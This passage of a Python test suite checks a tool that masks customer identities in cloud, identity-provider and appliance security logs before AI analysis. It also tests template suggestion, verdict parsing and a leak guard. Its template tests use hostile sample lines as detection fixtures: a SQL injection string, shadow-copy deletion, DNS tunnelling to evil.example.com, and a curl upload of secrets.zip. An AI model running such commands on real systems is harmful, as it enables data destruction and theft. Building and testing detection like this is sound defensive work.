    check("csv one placeholder per user", len(ph) == 1)
    check("csv description value consistent", masked.count(ph[0]) == 3)
    # A comma-separated log line (Symantec EP) must NOT trigger column masking.
    sep = ("Jun 10 14:23:01 sepm01 SymantecServer: Virus found,IP Address: "
           "10.1.2.3,Computer name: WS-FIN-07,Risk name: EICAR,User name: j.smith\n"
           "Jun 10 14:23:02 sepm01 SymantecServer: Scan complete,IP Address: "
           "10.1.2.4,Computer name: WS-FIN-08,Risk name: none,User name: k.lee\n")
    m2, _ = masker.mask(sep, ALL)
    check("non-csv log untouched by csv pass",
          "Virus found" in m2 and "Scan complete" in m2 and "j.smith" not in m2)


# ---------------------------------------------------------------------------
# Cloud and SaaS log sources.
#
# One test per product family, using the wire format each product actually
# ships. The assertions are two-sided on purpose: the customer's identities and estate
# must be gone, and the investigative content — verdicts, vendor product
# names, MITRE ids, file hashes — must survive, or the analysis the masked
# log is being sent for becomes impossible.
# ---------------------------------------------------------------------------
def test_aws_connector_logs():
    # CloudTrail, Config, S3 server access, Security Hub findings.
    raw = (
        '{"eventName":"ConsoleLogin","userIdentity":{"type":"IAMUser",'
        '"principalId":"AIDACKCEVSQ6C2EXAMPLE","arn":'
        '"arn:aws:iam::123456789012:user/j.smith","accountId":"123456789012",'
        '"accessKeyId":"ASIAIOSFODNN7EXAMPLE","userName":"j.smith"},'
        '"sourceIPAddress":"203.0.113.5","recipientAccountId":"123456789012"}\n'
        '{"configurationItem":{"awsAccountId":"123456789012","resourceId":'
        '"i-0abc123def4567890","resourceName":"web-prod-01"}}\n'
        "79a59df900b949e55d96a1e698fbacedfd6e09d98eacf8f8d5218e7cd47ef2be "
        "acme-payroll-bucket [10/Jun/2026:14:23:01 +0000] 10.1.2.3 "
        "arn:aws:iam::123456789012:user/j.smith 3E57427F3EXAMPLE "
        "REST.GET.OBJECT payroll/2026-Q2.xlsx\n"
        '{"AwsAccountId":"123456789012","ProductArn":'
        '"arn:aws:securityhub:eu-west-1::product/aws/guardduty",'
        '"Types":["TTPs/Initial Access"]}\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    check("cloudtrail principal id masked", "AIDACKCEVSQ6C2EXAMPLE" not in masked)
    check("cloudtrail sts key masked", "ASIAIOSFODNN7EXAMPLE" not in masked)
    check("cloudtrail arn masked", "arn:aws:iam::123456789012" not in masked)
    check("aws account id masked everywhere", "123456789012" not in masked)
    check("config instance id masked", "i-0abc123def4567890" not in masked)
    check("config resource name masked", "web-prod-01" not in masked)
    check("s3 bucket masked", "acme-payroll-bucket" not in masked)
    check("s3 object key masked", "payroll/2026-Q2.xlsx" not in masked)
    check("arn is one token",
          "arn:aws:iam::123456789012:user/j.smith" in mapping.values())
    # The vendor's own product ARN carries no account and names the detector.
    check("securityhub product arn kept",
          "arn:aws:securityhub:eu-west-1::product/aws/guardduty" in masked)
    check("event name kept", '"eventName":"ConsoleLogin"' in masked)
    check("finding type kept", "TTPs/Initial Access" in masked)


def test_identity_provider_connector_logs():
    # Okta, OneLogin, Duo Security, JumpCloud, Entra ID (AADUserInfo).
    raw = (
        '{"eventType":"user.session.start","actor":{"id":"00u1abcdefGHIJKLmno0h8",'
        '"type":"User","alternateId":"jsmith@acme-corp.com","displayName":"John Smith"},'
        '"client":{"ipAddress":"203.0.113.5"},"target":[{"id":"0oa1bcdefGHIJKLmno0h8",'
        '"alternateId":"Acme Payroll App"}],"outcome":{"result":"SUCCESS"}}\n'
        '{"event_type_id":8,"user_name":"John Smith","user_id":123456,'
        '"actor_user_name":"Jane Doe","ipaddr":"203.0.113.5","app_name":"Acme Payroll"}\n'
        '{"access_device":{"ip":"203.0.113.5","hostname":"WS-FIN-07"},'
        '"user":{"name":"jsmith","key":"DUEXAMPLE01234567890"},'
        '"integration_key":"DIEXAMPLE01234567890","result":"denied",'
        '"reason":"user_marked_fraud"}\n'
        '{"event_type":"sso_auth","initiated_by":{"id":"5f8a1b2c3d4e5f6a7b8c9d0e",'
        '"type":"user","username":"jsmith"},"client_ip":"203.0.113.5"}\n'
        '{"userPrincipalName":"j.smith@acme-corp.com","onPremisesSamAccountName":"jsmith",'
        '"department":"Finance-EU","mobilePhone":"+15551234567"}\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    check("okta actor id masked", "00u1abcdefGHIJKLmno0h8" not in masked)
    check("okta target app id masked", "0oa1bcdefGHIJKLmno0h8" not in masked)
    check("okta display name one token", "John Smith" in mapping.values())
    check("okta target app name masked", "Acme Payroll App" not in masked)
    check("okta outcome kept", '"result":"SUCCESS"' in masked)
    check("onelogin numeric user id masked", "123456" not in masked)
    check("onelogin actor name masked", "Jane Doe" not in masked)
    check("duo nested user name masked", '"name":"jsmith"' not in masked)
    check("duo integration key masked", "DIEXAMPLE01234567890" not in masked)
    check("duo device key masked", "DUEXAMPLE01234567890" not in masked)
    check("duo denial reason kept", '"reason":"user_marked_fraud"' in masked)
    check("jumpcloud object id masked", "5f8a1b2c3d4e5f6a7b8c9d0e" not in masked)
    check("entra upn masked", "j.smith@acme-corp.com" not in masked)
    check("entra department masked", "Finance-EU" not in masked)
    check("entra phone masked", "+15551234567" not in masked)


def test_saas_audit_connector_logs():
    # GitHub, Atlassian Jira, Zoom, DocuSign, Dynamics 365, Power Platform.
    # The 24-character account id is bound here rather than written inline: it
    # has the shape of a real token, and secret scanners flag that shape when
    # it sits next to the vendor's name.
    account_id = "exampleaccountid00000001"
    raw = (
        '{"action":"repo.destroy","actor":"jsmith","actor_ip":"203.0.113.5",'
        '"org":"acme-corp","repo":"acme-corp/payments-api","business":"acme-holdings"}\n'
        '{"authorKey":"jsmith","authorAccountId":"' + account_id + '",'
        '"summary":"User added to group","objectItem":{"name":"acme-admins",'
        '"typeName":"GROUP"},"remoteAddress":"203.0.113.5"}\n'
        '{"operator":"j.smith@acme-corp.com","action":"Update","payload":{"object":'
        '{"topic":"Board Review Q2","participant":{"user_name":"John Smith",'
        '"email":"m.brown@acme-corp.com"}}}}\n'
        '{"userId":"aa11bb22-cc33-dd44-ee55-ff6677889900","email":"j.smith@acme-corp.com",'
        '"ipAddress":"203.0.113.5","object":"envelope","action":"Sent"}\n'
        '{"UserId":"j.smith@acme-corp.com","Organization":"acmecorp",'
        '"EntityName":"account","ClientIp":"203.0.113.5"}\n'
        '{"environmentName":"Acme-Prod","appName":"Expense Approvals",'
        '"createdBy":"j.smith@acme-corp.com","connectorName":"SQL Server"}\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    check("github actor masked", "jsmith" not in masked)
    check("github org masked", '"org":"acme-corp"' not in masked)
    check("github repo masked", "acme-corp/payments-api" not in masked)
    check("github business masked", "acme-holdings" not in masked)
    check("github action kept", '"action":"repo.destroy"' in masked)
    check("jira account id masked", account_id not in masked)
    check("jira group masked", "acme-admins" not in masked)
    check("jira summary kept", "User added to group" in masked)
    check("zoom topic masked", "Board Review Q2" not in masked)
    check("zoom participant name one token", "John Smith" in mapping.values())
    check("zoom emails masked", "acme-corp.com" not in masked)
    check("docusign object kept", '"object":"envelope"' in masked)
    check("dynamics org masked", "acmecorp" not in masked)
    check("power platform environment masked", "Acme-Prod" not in masked)
    check("power platform app masked", "Expense Approvals" not in masked)


def test_cloud_platform_connector_logs():
    # GCP audit, Azure Storage, Office 365, Purview DLP, MCAS, M365 Defender.
    raw = (
        '{"protoPayload":{"authenticationInfo":{"principalEmail":"jsmith@acme-corp.com"},'
        '"requestMetadata":{"callerIp":"203.0.113.5"},"resourceName":'
        '"projects/acme-prod-1234/zones/europe-west1-b/instances/web-prod-01"},'
        '"resource":{"labels":{"project_id":"acme-prod-1234"}}}\n'
        '{"category":"StorageWrite","accountName":"acmeprodstorage",'
        '"callerIpAddress":"203.0.113.5","uri":'
        '"https://acmeprodstorage.blob.core.windows.net/payroll/2026-Q2.xlsx"}\n'
        '{"UserId":"j.smith@acme-corp.com","Operation":"FileDownloaded",'
        '"SiteUrl":"https://acmecorp.sharepoint.com/sites/Finance/",'
        '"SourceFileName":"payroll-2026.xlsx","TargetUserOrGroupName":"Finance Team"}\n'
        '{"Operation":"DLPRuleMatch","PolicyDetails":[{"PolicyName":"EU Payroll PII"}],'
        '"SensitiveInfoTypeData":[{"SensitiveType":"Credit Card Number",'
        '"DetectedValues":[{"Value":"4111 1111 1111 1111"}]}]}\n'
        '{"user":{"userName":"j.smith@acme-corp.com"},"appName":"Box",'
        '"description":"Impossible travel activity"}\n'
        '{"deviceName":"ws-fin-07.acme-corp.local","rbacGroupName":"Finance-EU",'
        '"cveId":"CVE-2026-1234","softwareName":"acrobat_reader_dc"}\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    check("gcp project masked", "acme-prod-1234" not in masked)
    check("gcp resource path masked", "instances/web-prod-01" not in masked)
    check("gcp service kept", "compute" in masked or "principalEmail" in masked)
    check("azure blob path masked", "/payroll/2026-Q2.xlsx" not in masked)
    check("o365 sharepoint site path masked", "/sites/Finance/" not in masked)
    check("o365 document name masked", "payroll-2026.xlsx" not in masked)
    check("o365 target group masked", "Finance Team" not in masked)
    check("o365 operation kept", '"Operation":"FileDownloaded"' in masked)
    check("purview policy name masked", "EU Payroll PII" not in masked)
    check("purview detected value masked", "4111 1111 1111 1111" not in masked)
    check("purview sensitive type kept", "Credit Card Number" in masked)
    # "Box" names the SaaS vendor, not the customer: masking it would remove
    # the one fact the impossible-travel alert is about.
    check("mcas vendor app kept", '"appName":"Box"' in masked)
    check("mcas verdict kept", "Impossible travel activity" in masked)
    check("defender rbac group masked", "Finance-EU" not in masked)
    check("defender cve kept", "CVE-2026-1234" in masked)


def test_appliance_connector_logs():
    # CylancePROTECT, Imperva WAF Gateway, Qualys VM, Infoblox NIOS,
    # UniFi Security Gateway, pfSense, Symantec ProxySG, Cribl.
    raw = (
        "Jun 10 14:23:01 cylance CylancePROTECT: Event Type: Threat, "
        "Event Name: threat_found, Device Name: WS-FIN-07, IP Address: (10.1.2.3), "
        "File Name: payroll.exe, Zone Names: (Finance-EU), User Name: j.smith\n"
        "CEF:0|Imperva Inc.|SecureSphere|14.7|Signature|SQL Injection|High|act=block "
        "src=203.0.113.5 suser=j.smith sourceServiceName=acme-payments-web "
        "cs1Label=Policy cs1=Acme-Prod-Policy\n"
        "<HOST><ID>1234567</ID><IP>10.1.2.3</IP><DNS>ws-fin-07.acme-corp.local</DNS>"
        "<NETBIOS>WS-FIN-07</NETBIOS><OS>Windows 11</OS></HOST>\n"
        "Jun 10 14:23:01 infoblox-01 named[1234]: client 10.1.2.3#54321: "
        "query: payroll.acme-corp.local IN A + (10.1.2.5)\n"
        "Jun 10 14:23:01 USG-HQ-01 kernel: [WAN_LOCAL-default-D]IN=eth0 OUT= "
        "SRC=203.0.113.5 DST=10.1.2.3 PROTO=TCP SPT=51122 DPT=22\n"
        "Jun 10 14:23:01 pfsense-hq filterlog: 5,,,1000000103,em0,match,block,in,4,"
        "0x0,,64,12345,0,DF,6,tcp,60,203.0.113.5,10.1.2.3,51122,443\n"
        '{"time":"2026-06-10T14:23:01.123Z","channel":"clustercomm",'
        '"host":"cribl-leader-01.acme.local","user":"jsmith"}\n'
    )
    masked, mapping = masker.mask(raw, ALL)
    check("cylance device masked", "WS-FIN-07" not in masked)
    check("cylance zone masked", "Finance-EU" not in masked)
    check("cylance user masked", "j.smith" not in masked)
    check("cylance event name kept", "Event Name: threat_found" in masked)
    check("imperva service masked", "acme-payments-web" not in masked)
    check("imperva cs1 policy masked", "Acme-Prod-Policy" not in masked)
    check("imperva signature kept", "SQL Injection" in masked)
    check("imperva vendor kept", "Imperva Inc.|SecureSphere" in masked)
    check("qualys dns masked", "ws-fin-07.acme-corp.local" not in masked)
    check("qualys netbios masked", "<NETBIOS>[HOST_" in masked)
    check("qualys os kept", "<OS>Windows 11</OS>" in masked)
    check("infoblox host masked", "infoblox-01" not in masked)
    check("infoblox query masked", "payroll.acme-corp.local" not in masked)
    check("unifi device masked", "USG-HQ-01" not in masked)
    check("unifi rule kept", "[WAN_LOCAL-default-D]" in masked)
    check("pfsense host masked", "pfsense-hq" not in masked)
    check("pfsense verdict kept", "match,block,in" in masked)
    check("cribl host masked", "cribl-leader-01.acme.local" not in masked)
    check("cribl channel kept", '"channel":"clustercomm"' in masked)


def test_phishing_evidence_is_not_masked():
    # Proofpoint TAP: the recipient is customer data, but the subject line,
    # the attachment name and the hash are the evidence the analyst is
    # asking about — masking them would make the answer worthless.
    raw = (
        '{"sender":"attacker@evil-domain.test","recipient":["j.smith@acme-corp.com"],'
        '"subject":"Q2 Payroll Invoice","senderIP":"203.0.113.5",'
        '"messageParts":[{"filename":"invoice.doc","sha256":'
        '"aabbccddeeff00112233445566778899aabbccddeeff001122334455667788ff"}]}'
    )
    masked, mapping = masker.mask(raw, ALL)
    check("proofpoint recipient masked", "j.smith@acme-corp.com" not in masked)
    check("proofpoint sender masked", "attacker@evil-domain.test" not in masked)
    check("proofpoint subject kept", '"subject":"Q2 Payroll Invoice"' in masked)
    check("proofpoint attachment kept", '"filename":"invoice.doc"' in masked)
    check("proofpoint hash kept",
          "aabbccddeeff00112233445566778899aabbccddeeff001122334455667788ff"
          in masked)


def test_connector_patterns_are_not_trigger_happy():
    # The connector patterns are anchored on vendor keys; ordinary telemetry
    # that merely mentions the same words must come through untouched.
    raw = (
        '{"appName":"Salesforce","organization":"Okta","policy":"allow",'
        '"role":"member","account_id":"12","group":"0","topic":"a"}\n'
        "arn:aws:securityhub:eu-west-1::product/aws/securityhub\n"
        "Deleted C:\\Windows\\System32\\drivers\\etc\\hosts, exit code 0\n"
    )
    masked, mapping = masker.mask(raw, ALL)
    check("vendor app name kept", '"appName":"Salesforce"' in masked)
    check("vendor org name kept", '"organization":"Okta"' in masked)
    check("bare policy key kept", '"policy":"allow"' in masked)
    check("short group id kept", '"group":"0"' in masked)
    check("short account id kept", '"account_id":"12"' in masked)
    check("short topic kept", '"topic":"a"' in masked)
    check("vendor arn kept", "product/aws/securityhub" in masked)
    check("system path kept", "C:\\Windows\\System32\\drivers\\etc\\hosts" in masked)


def test_custom_patterns():
    raw = "Closed INC0012345 for customer CUST-99812 at 10:00"
    pats = [
        {"label": "ticket", "regex": r"INC\d{7}"},
        {"label": "CUSTOMER-ID", "regex": r"CUST-\d+"},
        {"label": "broken", "regex": r"(unclosed"},   # must be skipped, not crash
    ]
    masked, mapping = masker.mask(raw, [], custom_patterns=pats)
    check("custom pattern ticket masked", "INC0012345" not in masked)
    check("custom pattern customer masked", "CUST-99812" not in masked)
    check("custom label normalized", "[TICKET_1]" in masked)
    check("custom label chars cleaned", "[CUSTOMERID_1]" in masked)
    restored = masker.unmask(masked, mapping)
    check("custom patterns roundtrip", restored == raw)


def test_custom_patterns_persistence():
    import os
    backup = None
    if os.path.exists(masker.PATTERNS_FILE):
        with open(masker.PATTERNS_FILE, encoding="utf-8") as f:
            backup = f.read()
    try:
        masker.save_custom_patterns([{"label": "TICKET", "regex": r"INC\d{7}"}])
        loaded = masker.load_custom_patterns()
        check("pattern persisted", loaded == [{"label": "TICKET", "regex": r"INC\d{7}"}])
        masked, _ = masker.mask("see INC0012345", [], custom_patterns=loaded)
        check("persisted pattern applies", "INC0012345" not in masked)
    finally:
        if backup is None:
            os.remove(masker.PATTERNS_FILE)
        else:
            with open(masker.PATTERNS_FILE, "w", encoding="utf-8") as f:
                f.write(backup)


def test_conversation_mapping():
    # Turn 1: a log is masked.
    log = "Jun 10 14:23:01 srv-web-01 sshd[1]: Accepted publickey for jsmith from 10.1.2.3"
    masked1, map1 = masker.mask(log, ALL)
    user_ph = [k for k, v in map1.items() if v == "jsmith"][0]
    ip_ph = [k for k, v in map1.items() if v == "10.1.2.3"][0]

    # Turn 2: a follow-up question repeats values — bare "jsmith" matches no
    # generic pattern, but as a known value it must reuse its placeholder.
    q = "Is jsmith allowed to connect from 10.1.2.3? What about 10.9.9.9?"
    masked2, map2 = masker.mask(q, ALL, base_mapping=map1)
    check("known user re-masked in follow-up", "jsmith" not in masked2)
    check("known user keeps placeholder", user_ph in masked2)
    check("known ip keeps placeholder", ip_ph in masked2)
    check("new ip gets next number", "10.9.9.9" not in masked2)
    new_ip_ph = [k for k, v in map2.items() if v == "10.9.9.9"][0]
    check("numbering continues", new_ip_ph != ip_ph)
    check("mapping is cumulative",
          all(k in map2 for k in map1) and "10.9.9.9" in map2.values())
    # Un-masking an answer that mixes old and new placeholders works.
    restored = masker.unmask(f"{user_ph} connected from {new_ip_ph}", map2)
    check("conversation unmask", restored == "jsmith connected from 10.9.9.9")


def test_custom_term_priority():
    # The longest custom term must win over a substring term.
    masked, mapping = masker.mask("deploy to SRV-DB-02 now", [],
                                  custom_terms=["SRV", "SRV-DB-02"])
    check("longest custom term wins", "SRV-DB-02" in mapping.values())
    check("no partial custom mask", "-DB-02" not in masked)


def test_builtin_overrides():
    import os
    backup = None
    if os.path.exists(masker.OVERRIDES_FILE):
        with open(masker.OVERRIDES_FILE, encoding="utf-8") as f:
            backup = f.read()
    try:
        pats = masker.get_builtin_patterns()
        check("builtin patterns listed", len(pats) >= 45)
        check("builtin patterns have ids/sources/fields",
              all(p["id"] and p["source"] and p["label"] for p in pats))
        # Override the phone pattern with a custom shape.
        masker.set_builtin_pattern("phone", r"PH-\d{4}")
        m, _ = masker.mask("call PH-1234 or +49 170 1234567", ["identities"])
        check("override regex applies", "PH-1234" not in m)
        check("default regex replaced", "+49 170 1234567" in m)
        check("override flagged modified",
              [p for p in masker.get_builtin_patterns()
               if p["id"] == "phone"][0]["modified"])
        # A broken override must not be storable.
        try:
            masker.set_builtin_pattern("phone", r"(unclosed")
            check("broken override rejected", False)
        except Exception:
            check("broken override rejected", True)
        # Unknown id rejected.
        try:
            masker.set_builtin_pattern("no-such-id", r"x")
            check("unknown id rejected", False)
        except ValueError:
            check("unknown id rejected", True)
        # Reset restores the default behaviour.
        masker.reset_builtin_pattern("phone")
        m2, _ = masker.mask("call +49 170 1234567", ["identities"])
        check("reset restores default", "+49 170 1234567" not in m2)
    finally:
        if backup is None:
            if os.path.exists(masker.OVERRIDES_FILE):
                os.remove(masker.OVERRIDES_FILE)
        else:
            with open(masker.OVERRIDES_FILE, "w", encoding="utf-8") as f:
                f.write(backup)
        masker.reload_patterns()


def test_template_library():
    from log_masker import templates as tpl
    lib = tpl.list_templates()
    check("templates present", len(lib) >= 12)
    # Every template carries a MITRE tactic + technique id.
    check("all templates mapped to MITRE",
          all(t["tactic_id"].startswith("TA") and t["technique_id"].startswith("T")
              for t in lib))
    check("template ids unique", len({t["id"] for t in lib}) == len(lib))
    check("get_template works", tpl.get_template("brute_force")["technique_id"] == "T1110")
    check("unknown template empty", tpl.get_template("nope") == {})


def test_template_suggestion():
    from log_masker import templates as tpl
    cases = {
        "brute_force": "sshd: Failed password for invalid user admin from 1.2.3.4\n"
                       "Failed password for root from 1.2.3.4\naccount lockout",
        "ransomware_impact": "vssadmin.exe Delete Shadows /all /quiet\n"
                             "report.docx.lockbit\nREADME_decrypt.txt",
        "web_attack": "GET /p?q=1' UNION SELECT username,password FROM users-- 200",
        "lateral_movement": "psexec \\\\WS01\\ADMIN$  Logon Type: 3  4648",
        "dns_tunneling": "named query: aGVsbG8gd29ybGQgdGhpc2lzZXhmaWxkYXRh.evil.example.com TXT",
        "exfiltration": "curl -T secrets.zip ftp://x  sc-bytes 9831204 upload to mega.nz",
    }
    for expected, log in cases.items():
        top = tpl.suggest(log, limit=3)
        check(f"suggest top is {expected}", top and top[0]["id"] == expected)
        check(f"{expected} score in 0..1", 0 < top[0]["score"] <= 1)
    # A benign line should suggest nothing strong.
    check("no suggestion for benign log",
          tpl.suggest("2026-06-11T00:00:00Z INFO service started ok") == [])
    check("empty log -> no suggestion", tpl.suggest("") == [])


def test_template_editing():
    import os
    from log_masker import templates as tpl
    backup = None
    if os.path.exists(tpl.STORE_FILE):
        with open(tpl.STORE_FILE, encoding="utf-8") as f:
            backup = f.read()
    try:
        if os.path.exists(tpl.STORE_FILE):
            os.remove(tpl.STORE_FILE)
        tpl.reload()

        # Edit a built-in -> override persists, flagged modified.
        r = tpl.save_template("brute_force", {"prompt": "Custom BF prompt"})
        check("builtin edit applied", r["prompt"] == "Custom BF prompt")
        check("builtin edit flagged modified", r["modified"] is True)
        check("builtin edit persists",
              tpl.get_template("brute_force")["prompt"] == "Custom BF prompt")

        # Reset -> restores the default and clears the flag.
        tpl.reset_template("brute_force")
        check("builtin reset restores default",
              tpl.get_template("brute_force")["prompt"].startswith("Investigate"))
        check("builtin reset clears modified",
              tpl.get_template("brute_force")["modified"] is False)

        # Empty prompt is rejected.
        try:
            tpl.save_template("brute_force", {"prompt": "   "})
            check("empty prompt rejected", False)
        except ValueError:
            check("empty prompt rejected", True)

        # Create a custom template with keywords -> auto-suggests.
        c = tpl.create_template({"name": "Crypto Mining", "prompt": "Find miners",
                                 "technique_id": "T1496",
                                 "keywords": ["xmrig", "stratum+tcp"]})
        check("custom created", c["custom"] is True)
        check("custom in list", any(t["id"] == c["id"] for t in tpl.list_templates()))
        sug = tpl.suggest("worker connected to stratum+tcp pool, xmrig running")
        check("custom template auto-suggested", sug and sug[0]["id"] == c["id"])

        # Built-ins can't be deleted; custom can.
        try:
            tpl.delete_template("brute_force")
            check("builtin delete blocked", False)
        except ValueError:
            check("builtin delete blocked", True)
        tpl.delete_template(c["id"])
        check("custom deleted", not any(t["id"] == c["id"]
                                        for t in tpl.list_templates()))
    finally:
        if backup is None:
            if os.path.exists(tpl.STORE_FILE):
                os.remove(tpl.STORE_FILE)
        else:
            with open(tpl.STORE_FILE, "w", encoding="utf-8") as f:
                f.write(backup)
        tpl.reload()


def test_verdict_parsing():
    import json
    from log_masker import verdict as v
    resp = (
        "The source [IP_1] failed 412 logons against [USER_1] then succeeded.\n\n"
        "```json\n"
        "{\n"
        '  "verdict": "True-Positive",\n'
        '  "confidence": "HIGH",\n'
        '  "severity": "High",\n'
        '  "summary": "Successful brute force against [USER_1] from [IP_1].",\n'
        '  "mitre": [{"tactic":"Credential Access","technique":"Brute Force",'
        '"technique_id":"T1110"}],\n'
        '  "iocs": [{"type":"ip","value":"[IP_1]","context":"source"}],\n'
        '  "affected_entities": ["[USER_1]","[HOST_1]"],\n'
        '  "recommended_actions": ["Reset [USER_1] password","Block [IP_1]"],\n'
        '  "next_steps": []\n'
        "}\n"
        "```"
    )
    prose, parsed = v.split_response(resp)
    check("verdict block stripped from prose", "```json" not in prose)
    check("prose retained", "failed 412 logons" in prose)
    check("verdict value normalized", parsed["verdict"] == "true_positive")
    check("confidence normalized", parsed["confidence"] == "high")
    check("severity normalized", parsed["severity"] == "high")
    check("mitre parsed", parsed["mitre"][0]["technique_id"] == "T1110")
    check("empty arrays preserved", parsed["next_steps"] == [])

    mapping = {"[IP_1]": "203.0.113.5", "[USER_1]": "j.smith",
               "[HOST_1]": "WS-FIN-07"}
    rest = v.restore(parsed, masker.unmask, mapping)
    check("ioc value restored", rest["iocs"][0]["value"] == "203.0.113.5")
    check("action restored", rest["recommended_actions"][0] == "Reset j.smith password")
    check("entities restored", rest["affected_entities"] == ["j.smith", "WS-FIN-07"])
    # placeholders must NOT survive into the structured verdict
    blob = json.dumps(rest)
    check("no placeholders left in verdict", "[IP_1]" not in blob and "[USER_1]" not in blob)


def test_verdict_robustness():
    from log_masker import verdict as v
    p, none = v.split_response("Just prose, no structured verdict.")
    check("no verdict -> None", none is None)
    check("prose unchanged", p == "Just prose, no structured verdict.")
    _, broken = v.split_response("text\n```json\n{not valid,}\n```")
    check("broken json -> None", broken is None)
    # bare object (no fences) still recognised
    _, bare = v.split_response('{"verdict":"false_positive","summary":"benign"}')
    check("bare json verdict parsed", bare and bare["verdict"] == "false_positive")
    # unknown verdict value coerced to inconclusive
    _, weird = v.split_response('```json\n{"verdict":"maybe?"}\n```')
    check("unknown verdict coerced", weird["verdict"] == "inconclusive")


def test_leakguard_detectors():
    from log_masker import leakguard as lg
    # A typical fully-masked output must be silent (no alert fatigue).
    clean = ("Jun 10 14:23:01 [HOST_1] %ASA-6-605005: Login from [IP_1]/51122 "
             "for user '[USER_1]'\nUTF-8 CVE-2024-1234 T1110 SHA-256 "
             "[APIKEY_1] [CUSTOMERID_1] HTTP/1.1 200 OK")
    check("leakguard silent on clean text", lg.scan(clean) == [])
    # Partially-masked value -> high.
    f = lg.scan("login [USER_1] from j.smith desk", {"[USER_1]": "j.smith"})
    check("known value leftover high", f and f[0]["severity"] == "high"
          and f[0]["type"] == "known_value")
    # Custom term leftover -> high (case-insensitive).
    f = lg.scan("deploy Project-Falcon now", custom_terms=["project-falcon"])
    check("custom term leftover high", f and f[0]["type"] == "custom_term")
    # IP / email leftovers -> high; suppressed when category is off by choice.
    check("ip leftover high",
          lg.scan("from 203.0.113.5")[0]["type"] == "ip_address")
    check("ip ignored when network off",
          lg.scan("from 203.0.113.5", enabled=["identities"]) == [])
    check("email leftover high",
          lg.scan("to bob@acme-corp.com")[0]["type"] == "email")
    # Secret-ish and host-ish -> medium (advisory, non-blocking).
    f = lg.scan("token Zk9qP2xT7mB4vQ8sW1yD3aF6h on WS-FIN-07")
    types = {x["type"] for x in f}
    check("secret-like flagged", "secret_like" in types)
    check("host-like flagged", "host_like" in types)
    check("mediums do not block", lg.has_blocking(
        lg.scan("copy from WS-FIN-07 share")) is False)
    check("highs block", lg.has_blocking(lg.scan("from 203.0.113.5")) is True)
    # Numeric / short mapping values never flagged (the "0" lesson).
    check("short numeric mapping ignored",
          lg.scan("count 0 and 0 again", {"[DOMAIN_1]": "0"}) == [])


def test_leakguard_gate():
    """The /analyze gate blocks when masking is broken (e.g. a bad regex
    override), and proceeds + audits once acknowledged."""
    from log_masker import app as appmod
    from log_masker import masker as mk
    import os

    real_call, real_key = appmod.providers.call, appmod.get_api_key
    backup = None
    if os.path.exists(mk.OVERRIDES_FILE):
        with open(mk.OVERRIDES_FILE, encoding="utf-8") as f:
            backup = f.read()
    try:
        appmod.providers.call = (lambda *a, **k: "Analysis done. All fine.")
        appmod.get_api_key = lambda provider: "stub-key"
        # Sabotage the IPv4 pattern the way a careless edit could.
        mk.set_builtin_pattern("ipv4", r"ZZZ-NEVER-MATCHES")

        convs_before = set(appmod.CONVERSATIONS)
        audit_before = len(appmod.REQUEST_LOG)
        req = appmod.AnalyzeRequest(
            logs="conn from 203.0.113.5 ok", structured=False)
        res = appmod.analyze(req)
        check("gate blocks on unmasked ip", res.get("blocked") is True)
        check("gate reports the finding",
              res["warnings"][0]["type"] == "ip_address")
        check("blocked: no conversation created",
              set(appmod.CONVERSATIONS) == convs_before)
        check("blocked: nothing sent, nothing audited",
              len(appmod.REQUEST_LOG) == audit_before)

        res2 = appmod.analyze(appmod.AnalyzeRequest(
            logs="conn from 203.0.113.5 ok", structured=False,
            acknowledge_leaks=True))
        check("acknowledged send proceeds", res2.get("blocked") is None
              and res2["ai_response_restored"].startswith("Analysis done"))
        check("acknowledgement audited",
              appmod.REQUEST_LOG[-1].get("leakguard", {}).get("acknowledged")
              is True)
        appmod.CONVERSATIONS.pop(res2["conversation_id"], None)

        # With masking healthy again, the same log passes silently.
        mk.reset_builtin_pattern("ipv4")
        res3 = appmod.analyze(appmod.AnalyzeRequest(
            logs="conn from 203.0.113.5 ok", structured=False))
        check("healthy masking passes gate", res3.get("blocked") is None
              and res3["warnings"] == [])
        appmod.CONVERSATIONS.pop(res3["conversation_id"], None)
    finally:
        appmod.providers.call = real_call
        appmod.get_api_key = real_key
        if backup is None:
            if os.path.exists(mk.OVERRIDES_FILE):
                os.remove(mk.OVERRIDES_FILE)
        else:
            with open(mk.OVERRIDES_FILE, "w", encoding="utf-8") as f:
                f.write(backup)
        mk.reload_patterns()


def _backup_file(path):
    import os
    if os.path.exists(path):
        with open(path, encoding="utf-8") as f:
            return f.read()
    return None


def _restore_file(path, content):
    import os
    if content is None:
        if os.path.exists(path):
            os.remove(path)
    else:
        with open(path, "w", encoding="utf-8") as f:
            f.write(content)


def test_custom_store():
    """The global custom-terms / saved-patterns store persists and feeds
    masking, and those saved terms apply automatically at analyze time."""
    import os
    from log_masker import app as appmod
    from log_masker import store
    # Back up the store and the legacy files migration would read from, so the
    # empty-start assertion is not satisfied by pre-existing user data.
    backups = {f: _backup_file(f) for f in (
        store.STORE_FILE, store.LEGACY_PATTERNS_FILE, store.LEGACY_WORKSPACES_FILE)}
    real_call, real_key = appmod.providers.call, appmod.get_api_key
    try:
        for f in backups:
            if os.path.exists(f):
                os.remove(f)
        check("store starts empty", store.get_terms() == []
              and store.get_patterns() == [])

        store.set_terms(["Acme Corp", "Acme Corp", "  "])
        check("terms deduped + trimmed", store.get_terms() == ["Acme Corp"])

        store.add_pattern("TICKET", r"INC\d{7}")
        check("pattern saved",
              store.get_patterns() == [{"label": "TICKET", "regex": r"INC\d{7}"}])
        try:
            store.add_pattern("DUP", r"INC\d{7}")
            check("duplicate regex rejected", False)
        except ValueError:
            check("duplicate regex rejected", True)
        store.delete_pattern(0)
        check("pattern deleted", store.get_patterns() == [])

        # Saved terms apply at analyze time without being passed in the request.
        appmod.providers.call = (lambda *a, **k: "Looks fine.")
        appmod.get_api_key = lambda provider: "stub-key"
        store.set_terms(["falcon-project"])
        res = appmod.analyze(appmod.AnalyzeRequest(
            logs="login user=jsmith on falcon-project box", structured=False))
        check("saved terms applied at mask time",
              "falcon-project" not in res["masked_sent"])
        appmod.CONVERSATIONS.pop(res["conversation_id"], None)
    finally:
        appmod.providers.call = real_call
        appmod.get_api_key = real_key
        for f, content in backups.items():
            _restore_file(f, content)


def test_system_prompt():
    """The system prompt is editable + persisted, and the per-run toggle
    controls whether it (and the saved override) are sent to the AI."""
    from log_masker import app as appmod
    backup = _backup_file(appmod.CONFIG_FILE)
    captured = {}

